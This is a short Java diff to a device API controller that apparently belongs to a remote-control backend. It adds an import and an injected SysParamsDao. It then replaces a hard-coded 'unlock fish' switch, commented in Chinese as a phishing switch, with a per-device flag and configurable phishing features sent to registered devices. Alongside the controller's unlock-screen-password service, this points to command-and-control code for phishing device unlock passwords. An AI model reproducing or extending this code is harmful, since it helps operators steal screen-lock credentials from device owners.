@@ -13,6 +13,7 @@ import io.renren.modules.app.service.*;
 import io.renren.modules.app.vo.DeviceStatus;
 import io.renren.modules.app.vo.ServerConfig;
 import io.renren.modules.app.vo.UnLockParams;
+import io.renren.modules.sys.dao.SysParamsDao;
 import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -52,6 +53,9 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private UnlockScreenPwdService unlockScreenPwdService;
+
+    @Resource
+    private SysParamsDao sysParamsDao;
 
 
     //注册设备
@@ -217,7 +221,8 @@ public class DeviceApiController extends BaseApiController {
             serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
         }
 
-        serverConfig.setUnlockFish(true);//TODO 钓鱼开关
+        serverConfig.setUnlockFish(Objects.equals(dbDevice.getUnlockFish(), Constant.YN.Y));
+        serverConfig.setUnlockFishFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.UnlockFishFeatures));
 
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
